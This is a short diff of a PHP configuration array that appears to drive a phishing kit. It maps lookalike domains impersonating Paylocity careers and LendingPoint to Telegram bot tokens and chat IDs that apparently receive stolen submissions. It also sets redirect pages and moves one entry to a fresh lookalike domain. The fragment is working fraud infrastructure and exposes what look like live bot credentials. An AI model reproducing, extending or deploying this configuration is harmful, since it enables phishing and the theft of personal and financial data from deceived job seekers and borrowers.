@@ -15,13 +15,13 @@ $site_map = [
         'redirect' => 'https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
     
-    'lending-point.rf.gd' => [
+    'lendingpoint.ct.ws' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']
 
         ],
-        'redirect' => 'https://lending-point.rf.gd/cache_site/lendingpoint/processing.html'
+        'redirect' => 'https://lendingpoint.ct.ws/cache_site/lendingpoint/processing.html'
     ]
 ];
 
